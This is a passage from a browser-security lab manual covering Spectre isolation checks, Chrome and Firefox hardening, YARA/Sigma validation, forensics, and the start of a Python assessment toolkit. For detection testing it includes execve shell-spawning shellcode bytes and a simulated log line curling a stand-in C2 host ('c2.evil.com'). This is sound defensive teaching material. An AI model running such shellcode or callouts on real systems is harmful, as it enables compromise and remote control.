### Exercise 8: Spectre Mitigation Verification and Cross-Origin Isolation

**Objective:** Test browser Spectre mitigations — verify cross-origin isolation headers (COOP, COEP, CORP), `SharedArrayBuffer` gating, `performance.now()` resolution reduction, and `crossOriginIsolated` status.

**Step 1 — Compare isolated vs. non-isolated pages.**

```python
#!/usr/bin/env python3
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    
    # Non-isolated page
    page1 = browser.new_page()
    page1.goto("http://10.8.1.10:3005/insecure")
    page1.wait_for_timeout(1000)
    
    coi1 = page1.evaluate("() => self.crossOriginIsolated")
    sab1 = page1.evaluate("() => typeof SharedArrayBuffer !== 'undefined'")
    perf1 = page1.evaluate("""() => {
        const times = [];
        for (let i = 0; i < 100; i++) {
            const t1 = performance.now();
            const t2 = performance.now();
            if (t2 > t1) times.push(t2 - t1);
        }
        return Math.min(...times);
    }""")
    
    print("=== Non-Isolated Page ===")
    print(f"  crossOriginIsolated: {coi1}")
    print(f"  SharedArrayBuffer available: {sab1}")
    print(f"  performance.now() min delta: {perf1:.6f}ms")
    
    # Isolated page (COOP + COEP)
    page2 = browser.new_page()
    page2.goto("http://10.8.1.10:3005/secure")
    page2.wait_for_timeout(1000)
    
    coi2 = page2.evaluate("() => self.crossOriginIsolated")
    sab2 = page2.evaluate("() => typeof SharedArrayBuffer !== 'undefined'")
    perf2 = page2.evaluate("""() => {
        const times = [];
        for (let i = 0; i < 100; i++) {
            const t1 = performance.now();
            const t2 = performance.now();
            if (t2 > t1) times.push(t2 - t1);
        }
        return Math.min(...times);
    }""")
    
    print("\n=== Cross-Origin Isolated Page (COOP+COEP) ===")
    print(f"  crossOriginIsolated: {coi2}")
    print(f"  SharedArrayBuffer available: {sab2}")
    print(f"  performance.now() min delta: {perf2:.6f}ms")
    
    # Verify security headers
    response = page2.goto("http://10.8.1.10:3005/secure")
    headers = response.headers
    print(f"\n=== Security Headers ===")
    print(f"  COOP: {headers.get('cross-origin-opener-policy', 'MISSING')}")
    print(f"  COEP: {headers.get('cross-origin-embedder-policy', 'MISSING')}")
    print(f"  CORP: {headers.get('cross-origin-resource-policy', 'MISSING')}")
    
    browser.close()
```

**Expected output:**

```
=== Non-Isolated Page ===
  crossOriginIsolated: false
  SharedArrayBuffer available: false
  performance.now() min delta: 0.100000ms (reduced resolution)

=== Cross-Origin Isolated Page (COOP+COEP) ===
  crossOriginIsolated: true
  SharedArrayBuffer available: true
  performance.now() min delta: 0.005000ms (higher resolution — Spectre risk accepted)
```

**Verification:** Document the tradeoff: COOP+COEP enables `SharedArrayBuffer` (needed for multi-threaded Wasm/workers) but also enables high-resolution timing that Spectre attacks require. The isolation guarantee (own process group) makes this safe.

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 9: Browser Hardening Deployment

**Objective:** Deploy comprehensive browser hardening configurations for Chrome (enterprise policy) and Firefox (`about:config`), disabling JIT compilation, restricting extensions, enforcing site isolation, and blocking fingerprinting.

**Step 1 — Deploy Chrome enterprise hardening policy.**

```bash
# On VM1 or VM4 — deploy Chrome policy (Linux)
sudo mkdir -p /etc/opt/chrome/policies/managed/

sudo tee /etc/opt/chrome/policies/managed/security_hardening.json << 'POLICY'
{
  "ExtensionInstallBlocklist": ["*"],
  "ExtensionInstallAllowlist": [
    "cjpalhdlnbpafiamejdnhcphjbkeiagm"
  ],
  "SitePerProcess": true,
  "IsolateOrigins": "https://accounts.google.com,https://banking.example.com",
  "DefaultJavaScriptJitSetting": 2,
  "BrowserSignin": 0,
  "PasswordManagerEnabled": false,
  "AutofillCreditCardEnabled": false,
  "DefaultPopupsSetting": 2,
  "DefaultNotificationsSetting": 2,
  "DefaultGeolocationSetting": 2,
  "DefaultSensorsSetting": 2,
  "DefaultUsbGuardSetting": 2,
  "DefaultWebBluetoothGuardSetting": 2,
  "DnsOverHttpsMode": "secure",
  "BlockThirdPartyCookies": true,
  "SafeBrowsingProtectionLevel": 2,
  "DownloadRestrictions": 1,
  "SSLVersionMin": "tls1.2",
  "AudioCaptureAllowed": false,
  "VideoCaptureAllowed": false,
  "WebRtcIPHandling": "disable_non_proxied_udp",
  "NetworkPredictionOptions": 2
}
POLICY

echo "[+] Chrome enterprise policy deployed."
echo "    Key protections:"
echo "    - JIT DISABLED (DefaultJavaScriptJitSetting=2)"
echo "    - All extensions blocked except allowlisted"
echo "    - Strict site isolation enforced"
echo "    - Third-party cookies blocked"
echo "    - WebRTC IP leak prevented"
echo "    - Network prediction disabled (no Speculation Rules abuse)"

# Verify policy is applied
chromium-browser --headless --dump-dom "chrome://policy" 2>/dev/null | \
  grep -c "OK" || echo "(Launch browser and check chrome://policy)"
```

**Step 2 — Deploy Firefox security hardening.**

```bash
# Create a Firefox autoconfig for enterprise deployment
cat > /tmp/firefox_hardening.js << 'FFCONFIG'
// Firefox Security Hardening — about:config overrides

// Anti-fingerprinting
pref("privacy.resistFingerprinting", true);
pref("privacy.resistFingerprinting.letterboxing", true);

// Disable WebRTC IP leak
pref("media.peerconnection.ice.no_host", true);
pref("media.peerconnection.ice.default_address_only", true);

// Disable telemetry
pref("toolkit.telemetry.enabled", false);
pref("app.normandy.enabled", false);
pref("app.shield.optoutstudies.enabled", false);
pref("datareporting.policy.dataSubmissionEnabled", false);

// Network security
pref("network.dns.disablePrefetch", true);
pref("network.prefetch-next", false);
pref("network.http.speculative-parallel-limit", 0);
pref("dom.security.https_only_mode", true);
pref("network.IDN_show_punycode", true);

// JIT DISABLED — eliminates entire JIT attack surface
pref("javascript.options.baselinejit", false);
pref("javascript.options.ion", false);
pref("javascript.options.wasm", false);
pref("javascript.options.asmjs", false);

// Tracking protection
pref("privacy.trackingprotection.enabled", true);
pref("privacy.trackingprotection.socialtracking.enabled", true);
pref("network.cookie.cookieBehavior", 5);

// Content security
pref("dom.disable_open_during_load", true);
pref("security.mixed_content.block_active_content", true);
pref("security.mixed_content.block_display_content", true);

// TLS
pref("security.ssl.require_safe_negotiation", true);
pref("security.tls.version.min", 3);
pref("security.OCSP.enabled", 1);
pref("security.OCSP.require", true);
pref("security.cert_pinning.enforcement_level", 2);
FFCONFIG

echo "[+] Firefox hardening config generated at /tmp/firefox_hardening.js"
echo "    Key protections:"
echo "    - JIT DISABLED (baselinejit=false, ion=false, wasm=false)"
echo "    - Resist Fingerprinting enabled (uniform appearance)"
echo "    - HTTPS-only mode"
echo "    - All network prediction disabled"
echo "    - Strict TLS requirements"
echo ""
echo "    Performance impact: 3-10x slower JS execution"
echo "    Recommended for: kiosk systems, high-value targets, classified terminals"
```

**Step 3 — Verify JIT-less mode eliminates attack surface.**

```python
#!/usr/bin/env python3
# Verify that JIT-less mode prevents type confusion exploitation setup
from playwright.sync_api import sync_playwright

EXPLOIT_SETUP_JS = """() => {
    // Attempt to trigger TurboFan optimization (should fail in JIT-less)
    function hot(arr) { return arr[0]; }
    const a = [1.1, 2.2];
    for (let i = 0; i < 200000; i++) hot(a);
    
    // Check if we can detect JIT status
    const start = performance.now();
    let sum = 0;
    for (let i = 0; i < 1000000; i++) sum += i;
    const elapsed = performance.now() - start;
    
    return {
        elapsed_ms: elapsed,
        jit_likely: elapsed < 5,  // JIT: <5ms, interpreter: >50ms
        note: elapsed < 5 ? 'JIT active — exploitation possible' : 
              'Interpreter only — JIT attack surface eliminated'
    };
}"""

with sync_playwright() as p:
    # Standard mode (JIT enabled)
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.goto("about:blank")
    result_jit = page.evaluate(EXPLOIT_SETUP_JS)
    print(f"Standard mode: {result_jit}")
    browser.close()
    
    # JIT-less mode
    browser = p.chromium.launch(headless=True, args=["--js-flags=--jitless"])
    page = browser.new_page()
    page.goto("about:blank")
    result_nojit = page.evaluate(EXPLOIT_SETUP_JS)
    print(f"JIT-less mode: {result_nojit}")
    browser.close()
```

---

### Exercise 10: Detection Engineering — YARA, Sigma, and Suricata Validation

**Objective:** Validate all detection rules against test samples, ensure zero false negatives on known-bad patterns, and tune for acceptable false positive rates.

**Step 1 — Run the full validation suite.**

```bash
# On VM3 — validate all detection rules
/opt/detection/validate_rules.sh
```

**Step 2 — Test YARA rules against real-world exploit samples.**

```bash
# Create realistic test samples and run YARA
mkdir -p /tmp/yara-validation

# Shellcode sample (Linux x86-64 execve)
python3 -c "
import sys
shellcode = bytes([0x48,0x31,0xf6,0x56,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x57,0x48,0x89,0xe7,0x48,0x31,0xd2,0xb0,0x3b,0x0f,0x05])
sys.stdout.buffer.write(shellcode)
" > /tmp/yara-validation/shellcode.bin

yara /opt/detection/yara/browser_exploit_shellcode.yar /tmp/yara-validation/shellcode.bin
echo "Expected: Browser_Exploit_Shellcode_Indicators match"

# Benign JavaScript (should NOT match heap spray rule)
cat > /tmp/yara-validation/benign.js << 'BENIGN'
const data = new ArrayBuffer(1024);
const view = new Float64Array(data);
for (let i = 0; i < view.length; i++) {
  view[i] = Math.random();
}
console.log('Average:', view.reduce((a,b) => a+b) / view.length);
BENIGN

yara /opt/detection/yara/v8_heap_spray.yar /tmp/yara-validation/benign.js
echo "Expected: no match (false positive check)"

rm -rf /tmp/yara-validation
```

**Step 3 — Sigma rule correlation test.**

```bash
# Simulate a browser exploitation scenario in logs
cat > /tmp/browser_exploit_log.json << 'LOG'
{"timestamp":"2026-05-18T10:15:00Z","event_type":"process_crash","Image":"/usr/bin/chromium","Signal":"SIGSEGV","pid":12345}
{"timestamp":"2026-05-18T10:15:01Z","event_type":"process_crash","Image":"/usr/bin/chromium","Signal":"SIGSEGV","pid":12346}
{"timestamp":"2026-05-18T10:15:02Z","event_type":"process_crash","Image":"/usr/bin/chromium","Signal":"SIGSEGV","pid":12347}
{"timestamp":"2026-05-18T10:15:03Z","event_type":"process_crash","Image":"/usr/bin/chromium","Signal":"SIGSEGV","pid":12348}
{"timestamp":"2026-05-18T10:15:30Z","event_type":"process_creation","ParentImage":"/usr/bin/chromium","Image":"/bin/bash","CommandLine":"bash -c 'curl http://c2.evil.com/beacon'"}
LOG

echo "=== Log Analysis ==="
echo "4 SIGSEGV crashes in 3 seconds → triggers browser_crash_exploitation.yml (>3 in 5m)"
echo "chromium spawning /bin/bash → triggers browser_child_process.yml (CRITICAL)"
echo ""
echo "Combined: HIGH CONFIDENCE browser exploitation + sandbox escape"
```

---

### Exercise 11: Browser Forensics — Incident Response Workflow

**Objective:** Conduct a full browser forensics investigation: extract browsing history, analyze downloads, audit cookie security, examine extensions for malicious indicators, inspect ServiceWorker persistence, and analyze crash dumps for exploitation indicators.

**Step 1 — Run the complete forensics toolkit.**

```bash
# On VM4 — run against a Chrome profile
python3 /opt/forensics/browser_forensics.py \
  ~/.config/google-chrome/Default 2>/dev/null | \
  python3 -m json.tool | head -100

# If Chrome profile doesn't exist, analyze a test profile:
python3 << 'FORENSICS_DEMO'
import json, os, sqlite3, tempfile

# Create a mock Chrome profile for demonstration
profile = tempfile.mkdtemp()
print(f"Test profile: {profile}")

# Create History database
conn = sqlite3.connect(os.path.join(profile, "History"))
conn.execute("""CREATE TABLE urls (
    id INTEGER PRIMARY KEY, url TEXT, title TEXT,
    visit_count INTEGER, typed_count INTEGER,
    last_visit_time INTEGER)""")
conn.execute("""CREATE TABLE downloads (
    id INTEGER PRIMARY KEY, target_path TEXT, tab_url TEXT,
    total_bytes INTEGER, mime_type TEXT, danger_type INTEGER,
    state INTEGER, start_time INTEGER)""")

# Insert test data
import time
chrome_time = (int(time.time()) + 11644473600) * 1000000

conn.execute("INSERT INTO urls VALUES (1, 'https://exploit-kit.evil.com/payload.html', 'Free Software', 1, 0, ?)", (chrome_time,))
conn.execute("INSERT INTO urls VALUES (2, 'https://banking.example.com/login', 'Banking Login', 5, 3, ?)", (chrome_time - 3600000000,))
conn.execute("INSERT INTO urls VALUES (3, 'https://normal-site.com/', 'Normal Site', 10, 5, ?)", (chrome_time - 7200000000,))

conn.execute("INSERT INTO downloads VALUES (1, '/tmp/update.exe', 'https://suspicious.com/download', 524288, 'application/x-dosexec', 3, 1, ?)", (chrome_time,))
conn.execute("INSERT INTO downloads VALUES (2, '/home/user/document.pdf', 'https://office.example.com/doc', 102400, 'application/pdf', 0, 1, ?)", (chrome_time - 86400000000,))

conn.commit()
conn.close()

# Run forensics analysis
import sys
sys.path.insert(0, '/opt/forensics')
from browser_forensics import generate_report

report = generate_report(profile)
print(json.dumps(report["summary"], indent=2))

if report["summary"]["suspicious_urls"] > 0:
    print("\n[!] SUSPICIOUS URLs DETECTED:")
    for h in report["history"]:
        if h.get("suspicious"):
            print(f"    {h['visit_time']} — {h['url']}")

if report["summary"]["dangerous_downloads"] > 0:
    print("\n[!] DANGEROUS DOWNLOADS DETECTED:")
    for d in report["downloads"]:
        if d.get("dangerous"):
            print(f"    {d['start_time']} — {d['target_path']} (from {d['source_url']}) [{d['danger_type']}]")

# Cleanup
import shutil
shutil.rmtree(profile)
FORENSICS_DEMO
```

**Step 2 — Chrome crash dump analysis.**

```bash
# Analyze crash dumps for exploitation indicators
cat << 'CRASH_ANALYSIS'
=== Crash Dump Exploitation Indicator Checklist ===

1. Crash in JIT code region (TurboFan/Maglev/Liftoff frames)
   → Potential V8 type confusion exploitation
   grep: v8::internal::Compiler, v8::internal::wasm

2. Crash in Mojo serialization code
   → Potential IPC exploitation / sandbox escape attempt
   grep: mojo::, content::mojom

3. Crash at controlled addresses (0x41414141, 0xDEADBEEF)
   → Controlled corruption / heap spray

4. PartitionAlloc canary failures
   → Heap overflow / use-after-free exploitation

5. Crash after ArrayBuffer/TypedArray construction with unusual size
   → OOB access setup for addrof/fakeobj

6. Repeated renderer crashes in short window (>3 in 5 minutes)
   → Exploit spraying / brute-force reliability
CRASH_ANALYSIS
```

---

## PART C: FRAMEWORK DEVELOPMENT

Build `browser_security_toolkit.py` — a comprehensive Python framework for browser security assessment.

```python
#!/usr/bin/env python3
"""
Browser Security Assessment Toolkit

Modular framework for browser security analysis combining:
- SOP/CORS misconfiguration scanning
- XS-Leak vector detection
- Cookie security auditing
- Extension forensics
- ServiceWorker persistence detection
- Browser fingerprint analysis
- Cross-origin isolation verification
- Security header assessment
- Detection rule generation (YARA/Sigma)

Usage:
    python3 browser_security_toolkit.py --target http://example.com --modules all
    python3 browser_security_toolkit.py --target http://example.com --modules cors,cookies,headers
    python3 browser_security_toolkit.py --profile ~/.config/google-chrome/Default --modules forensics
"""

import argparse
import json
import hashlib
import os
import sys
import sqlite3
import time
import re
import glob
from dataclasses import dataclass, field, asdict
from typing import Optional
from datetime import datetime, timezone
from urllib.parse import urlparse
import http.client
import ssl


# =====================================================================
# Core Infrastructure
# =====================================================================

@dataclass
class Finding:
    category: str
    title: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    description: str
    evidence: str = ""
    cwe: str = ""
    remediation: str = ""
    cvss: float = 0.0

@dataclass
class ModuleResult:
    module: str
    findings: list = field(default_factory=list)
    metadata: dict = field(default_factory=dict)
    error: str = ""

class HTTPClient:
    """Minimal HTTP client for header analysis."""
    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    def get_headers(self, url: str) -> dict:
        parsed = urlparse(url)
        if parsed.scheme == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(parsed.hostname, parsed.port or 443,
                                                timeout=self.timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80,
                                               timeout=self.timeout)
        try:
            conn.request("GET", parsed.path or "/", headers={"User-Agent": "BrowserSecToolkit/1.0"})
            resp = conn.getresponse()
            headers = {k.lower(): v for k, v in resp.getheaders()}
            headers['_status'] = resp.status
            return headers
        except Exception as e:
            return {"_error": str(e)}
        finally:
            conn.close()

    def cors_check(self, url: str, origin: str) -> dict:
        parsed = urlparse(url)
        if parsed.scheme == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(parsed.hostname, parsed.port or 443,
                                                timeout=self.timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80,
                                               timeout=self.timeout)
        try:
            conn.request("GET", parsed.path or "/", headers={
                "Origin": origin,
                "User-Agent": "BrowserSecToolkit/1.0"
            })
            resp = conn.getresponse()
            return {k.lower(): v for k, v in resp.getheaders()}
        except Exception as e:
            return {"_error": str(e)}
        finally:
            conn.close()


# =====================================================================
# Module 1: Security Header Scanner
# =====================================================================

class SecurityHeaderScanner:
    """Analyze HTTP response headers for browser security misconfigurations."""

    REQUIRED_HEADERS = {
        'strict-transport-security': {
            'description': 'HTTP Strict Transport Security',
            'severity': 'HIGH',
            'cwe': 'CWE-319',
            'fix': 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'
        },
        'x-content-type-options': {
            'description': 'MIME type sniffing prevention',
            'severity': 'MEDIUM',
            'cwe': 'CWE-16',
            'fix': 'Add: X-Content-Type-Options: nosniff'
        },
        'x-frame-options': {
            'description': 'Clickjacking protection',
            'severity': 'MEDIUM',
            'cwe': 'CWE-1021',
            'fix': 'Add: X-Frame-Options: DENY'
        },
        'content-security-policy': {
            'description': 'Content Security Policy',
            'severity': 'HIGH',
            'cwe': 'CWE-79',
            'fix': 'Add CSP with strict directives (nonce-based script-src)'
        },
        'referrer-policy': {
            'description': 'Referrer information control',
            'severity': 'LOW',
            'cwe': 'CWE-200',
            'fix': 'Add: Referrer-Policy: strict-origin-when-cross-origin'
        },
        'permissions-policy': {
            'description': 'Feature access control',
            'severity': 'LOW',
            'cwe': 'CWE-16',
            'fix': 'Add: Permissions-Policy: camera=(), microphone=(), geolocation=()'
        }
    }

    ISOLATION_HEADERS = {
        'cross-origin-opener-policy': 'same-origin',
        'cross-origin-embedder-policy': 'require-corp',
        'cross-origin-resource-policy': 'same-origin'
    }

    def scan(self, url: str) -> ModuleResult:
        client = HTTPClient()
        headers = client.get_headers(url)
        result = ModuleResult(module="security_headers")

        if '_error' in headers:
            result.error = headers['_error']
            return result

        for header, info in self.REQUIRED_HEADERS.items():
            if header not in headers:
                result.findings.append(Finding(
                    category="missing_header",
                    title=f"Missing {info['description']} header",
                    severity=info['severity'],
                    description=f"The {header} header is not present in the response.",
                    cwe=info['cwe'],
                    remediation=info['fix']
                ))
            else:
                value = headers[header]
                if header == 'content-security-policy':
                    csp_issues = self._analyze_csp(value)
                    result.findings.extend(csp_issues)

        # Cross-origin isolation check
        isolated = all(h in headers for h in self.ISOLATION_HEADERS)
        if not isolated:
            missing = [h for h in self.ISOLATION_HEADERS if h not in headers]
            result.findings.append(Finding(
                category="cross_origin_isolation",
                title="Missing cross-origin isolation headers",
                severity="MEDIUM",
                description=f"Missing: {', '.join(missing)}. Page is NOT cross-origin isolated.",
                remediation="Add COOP: same-origin, COEP: require-corp, CORP: same-origin"
            ))

        result.metadata = {
            "url": url,
            "status": headers.get('_status'),
            "headers_present": len([h for h in self.REQUIRED_HEADERS if h in headers]),
            "headers_total": len(self.REQUIRED_HEADERS),
            "cross_origin_isolated": isolated
        }
        return result

    def _analyze_csp(self, csp: str) -> list:
        findings = []
        if "'unsafe-inline'" in csp and "script-src" in csp:
            findings.append(Finding(
                category="csp_weakness",
                title="CSP allows unsafe-inline scripts",
                severity="HIGH",
                description="Content-Security-Policy includes 'unsafe-inline' in script-src.",
                cwe="CWE-79",
                remediation="Use nonce-based CSP instead of 'unsafe-inline'"
            ))
        if "'unsafe-eval'" in csp:
            findings.append(Finding(
                category="csp_weakness",
                title="CSP allows unsafe-eval",
                severity="HIGH",
                description="Content-Security-Policy includes 'unsafe-eval'.",
                cwe="CWE-79",
                remediation="Remove 'unsafe-eval' and refactor code to avoid eval()"
            ))
        if "default-src" not in csp and "script-src" not in csp:
            findings.append(Finding(
                category="csp_weakness",
                title="CSP missing default-src and script-src",
                severity="HIGH",
                description="CSP does not restrict script sources.",
                remediation="Add default-src 'self' and explicit script-src"
            ))
        return findings


# =====================================================================
# Module 2: CORS Misconfiguration Scanner
# =====================================================================

class CORSScanner:
    """Detect CORS misconfiguration patterns."""

    TEST_ORIGINS = [
        "https://evil-attacker.com",
        "https://null",
        "https://target.com.evil.com",
    ]

    def scan(self, url: str) -> ModuleResult:
        client = HTTPClient()
        result = ModuleResult(module="cors_scanner")

        for origin in self.TEST_ORIGINS:
            headers = client.cors_check(url, origin)
            if '_error' in headers:
                continue

            acao = headers.get('access-control-allow-origin', '')
            acac = headers.get('access-control-allow-credentials', '')

            if acao == origin:
                severity = "CRITICAL" if acac.lower() == 'true' else "HIGH"
                result.findings.append(Finding(
                    category="cors_misconfiguration",
                    title=f"Origin {origin} reflected in ACAO",
                    severity=severity,
                    description=f"Server reflects '{origin}' in Access-Control-Allow-Origin"
                               + (f" with credentials enabled" if acac else ""),
                    evidence=f"ACAO: {acao}, ACAC: {acac}",
                    cwe="CWE-942",
                    remediation="Validate Origin against an explicit allowlist"
                ))

            if acao == '*' and acac.lower() == 'true':
                result.findings.append(Finding(
                    category="cors_misconfiguration",
                    title="Wildcard ACAO with credentials (spec violation)",
                    severity="CRITICAL",
                    description="ACAO=* with ACAC=true is forbidden by spec but server sends it.",
                    cwe="CWE-942",
                    remediation="Never use ACAO=* with credentials"
                ))

        result.metadata = {"url": url, "origins_tested": len(self.TEST_ORIGINS)}
        return result


# =====================================================================
# Module 3: Cookie Security Auditor
# =====================================================================

class CookieAuditor:
    """Audit cookies from a Chrome profile for security issues."""

    CHROME_EPOCH = 11644473600

    def scan(self, profile_path: str) -> ModuleResult:
        result = ModuleResult(module="cookie_audit")
        db_path = os.path.join(profile_path, "Cookies")

        if not os.path.exists(db_path):
            result.error = f"Cookies database not found at {db_path}"
            return result

        try:
            conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, samesite FROM cookies")

            total = 0
            for row in cursor.fetchall():
                total += 1
                domain, name, path, secure, httponly, samesite = row
                issues = []

                if not secure:
                    issues.append("MISSING_SECURE")
                if not httponly:
                    issues.append("MISSING_HTTPONLY")
                if samesite in (-1, 0):
                    issues.append("WEAK_SAMESITE")
                if name.startswith("session") and not secure:
                    issues.append("SESSION_COOKIE_INSECURE")

                if issues:
                    severity = "HIGH" if "SESSION_COOKIE_INSECURE" in issues else \
                               "MEDIUM" if len(issues) >= 2 else "LOW"
                    result.findings.append(Finding(
                        category="cookie_security",
                        title=f"Insecure cookie: {name} ({domain})",
                        severity=severity,
                        description=f"Issues: {', '.join(issues)}",
                        evidence=f"secure={secure}, httponly={httponly}, samesite={samesite}",
                        remediation="Set Secure, HttpOnly, SameSite=Strict; use __Host- prefix"
                    ))

            conn.close()
            result.metadata = {"total_cookies": total, "issues_found": len(result.findings)}
        except Exception as e:
            result.error = str(e)

        return result


# =====================================================================
# Module 4: Extension Forensics
# =====================================================================

class ExtensionForensics:
    """Analyze Chrome extensions for malicious indicators."""

    DANGEROUS_PERMS = {"<all_urls>", "webRequestBlocking", "cookies",
                       "nativeMessaging", "debugger", "proxy"}

    def scan(self, profile_path: str) -> ModuleResult:
        result = ModuleResult(module="extension_forensics")
        ext_dir = os.path.join(profile_path, "Extensions")

        if not os.path.isdir(ext_dir):
            result.error = "Extensions directory not found"
            return result

        for ext_id in os.listdir(ext_dir):
            ext_path = os.path.join(ext_dir, ext_id)
            if not os.path.isdir(ext_path):
                continue
            versions = sorted(os.listdir(ext_path))
            if not versions:
                continue
            manifest_path = os.path.join(ext_path, versions[-1], "manifest.json")
            if not os.path.exists(manifest_path):
                continue

            try:
                with open(manifest_path) as f:
                    manifest = json.load(f)
            except (json.JSONDecodeError, IOError):
                continue

            name = manifest.get("name", "UNKNOWN")
            perms = set(manifest.get("permissions", []))
            host_perms = set(manifest.get("host_permissions", []))
            all_perms = perms | host_perms

            dangerous = all_perms & self.DANGEROUS_PERMS
            if dangerous:
                result.findings.append(Finding(
                    category="extension_security",
                    title=f"High-risk extension: {name} ({ext_id})",
                    severity="HIGH" if len(dangerous) >= 2 else "MEDIUM",
                    description=f"Dangerous permissions: {', '.join(dangerous)}",
                    evidence=f"All permissions: {', '.join(all_perms)}",
                    remediation="Review extension necessity; restrict via enterprise policy"
                ))

        result.metadata = {"extensions_analyzed": len(os.listdir(ext_dir))}
        return result


# =====================================================================
# Module 5: XS-Leak Detector
# =====================================================================

class XSLeakDetector:
    """Detect XS-Leak vulnerability exposure on a target."""

    def scan(self, url: str) -> ModuleResult:
        client = HTTPClient()
        headers = client.get_headers(url)
        result = ModuleResult(module="xs_leak_detection")

        if '_error' in headers:
            result.error = headers['_error']
            return result

        vectors = [
            ("frame_counting", "x-frame-options" not in headers and
             "frame-ancestors" not in headers.get("content-security-policy", ""),
             "X-Frame-Options or CSP frame-ancestors missing → frame counting XS-Leak",
             "Add X-Frame-Options: DENY and CSP frame-ancestors 'none'"),
            ("timing_oracle", "cross-origin-opener-policy" not in headers,
             "COOP missing → cross-origin window timing attacks possible",
             "Add Cross-Origin-Opener-Policy: same-origin"),
            ("error_events", "cross-origin-resource-policy" not in headers,
             "CORP missing → error event XS-Leak possible",
             "Add Cross-Origin-Resource-Policy: same-origin"),
            ("cache_probing", True,  # Always note unless storage partitioning confirmed
             "Cache-based timing attacks possible without storage partitioning",
             "Ensure target browser supports storage partitioning (Chrome 115+)"),
        ]

        for name, vulnerable, desc, fix in vectors:
            if vulnerable:
                result.findings.append(Finding(
                    category="xs_leak",
                    title=f"XS-Leak vector exposed: {name}",
                    severity="MEDIUM",
                    description=desc,
                    remediation=fix
                ))

        result.metadata = {"url": url, "vectors_checked": len(vectors)}
        return result


# =====================================================================
# Module 6: Detection Rule Generator
# =====================================================================

class DetectionRuleGenerator:
    """Generate YARA and Sigma rules for detected findings."""

    def generate_yara(self, findings: list) -> str:
        rules = []
        for f in findings:
            if f.severity in ("CRITICAL", "HIGH"):
                rule_name = re.sub(r'[^a-zA-Z0-9_]', '_', f.title)[:50]
                rules.append(f"""
rule {rule_name} {{
    meta:
        description = "{f.description[:100]}"
        severity = "{f.severity}"
        category = "{f.category}"
        generated = "{datetime.now(timezone.utc).isoformat()}"
    strings:
        $indicator = "{f.evidence[:50]}" ascii wide nocase
    condition:
        $indicator
}}""")
        return "\n".join(rules) if rules else "// No high-severity findings to generate rules for"

    def generate_sigma(self, findings: list) -> list:
        rules = []
        for f in findings:
            if f.severity in ("CRITICAL", "HIGH"):
                rules.append({
                    "title": f"Detected: {f.title}",
                    "status": "experimental",
                    "description": f.description,
                    "level": f.severity.lower(),
                    "tags": [f"attack.{f.category}"],
                    "generated": datetime.now(timezone.utc).isoformat()
                })
        return rules


# =====================================================================
# Report Generator
# =====================================================================

class ReportGenerator:
    """Generate assessment reports in JSON and Markdown formats."""

    def generate(self, results: list, fmt: str = "json") -> str:
        report = {
            "title": "Browser Security Assessment Report",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "summary": self._summary(results),
            "modules": [self._serialize_result(r) for r in results]
        }

        if fmt == "json":
            return json.dumps(report, indent=2, default=str)
        elif fmt == "markdown":
            return self._to_markdown(report)
        return json.dumps(report, indent=2, default=str)

    def _summary(self, results: list) -> dict:
        all_findings = []
        for r in results:
            all_findings.extend(r.findings)

        severity_counts = {}
        for f in all_findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        return {
            "total_findings": len(all_findings),
            "by_severity": severity_counts,
            "modules_run": len(results),
            "modules_with_errors": sum(1 for r in results if r.error),
            "overall_risk": "CRITICAL" if severity_counts.get("CRITICAL", 0) > 0 else
                           "HIGH" if severity_counts.get("HIGH", 0) > 0 else
                           "MEDIUM" if severity_counts.get("MEDIUM", 0) > 0 else "LOW"
        }

    def _serialize_result(self, result: ModuleResult) -> dict:
        return {
            "module": result.module,
            "findings": [asdict(f) for f in result.findings],
            "metadata": result.metadata,
            "error": result.error
        }

    def _to_markdown(self, report: dict) -> str:
        md = [f"# {report['title']}", f"**Generated:** {report['timestamp']}", ""]
        summary = report['summary']
        md.append(f"## Summary")
        md.append(f"- **Total findings:** {summary['total_findings']}")
        md.append(f"- **Overall risk:** {summary['overall_risk']}")
        for sev, count in sorted(summary['by_severity'].items()):
            md.append(f"- {sev}: {count}")
        md.append("")

        for module in report['modules']:
            md.append(f"## Module: {module['module']}")
            if module['error']:
                md.append(f"**Error:** {module['error']}")
            for f in module['findings']:
                md.append(f"### [{f['severity']}] {f['title']}")
                md.append(f"{f['description']}")
                if f['evidence']:
                    md.append(f"**Evidence:** `{f['evidence']}`")
                if f['remediation']:
                    md.append(f"**Fix:** {f['remediation']}")
                md.append("")

        return "\n".join(md)


# =====================================================================
# CLI Interface
# =====================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Browser Security Assessment Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--target", "-t", help="Target URL for remote scanning")
    parser.add_argument("--profile", "-p", help="Chrome profile path for local forensics")
    parser.add_argument("--modules", "-m", default="all",
                       help="Comma-separated modules: headers,cors,cookies,extensions,xsleak,all")
    parser.add_argument("--output", "-o", help="Output file path")
    parser.add_argument("--format", "-f", choices=["json", "markdown"], default="json",
                       help="Output format (default: json)")
    args = parser.parse_args()

    if not args.target and not args.profile:
        parser.error("Specify --target URL and/or --profile path")

    modules = args.modules.split(",") if args.modules != "all" else \
              ["headers", "cors", "xsleak", "cookies", "extensions"]

    results = []

    if args.target:
        if "headers" in modules:
            results.append(SecurityHeaderScanner().scan(args.target))
        if "cors" in modules:
            results.append(CORSScanner().scan(args.target))
        if "xsleak" in modules:
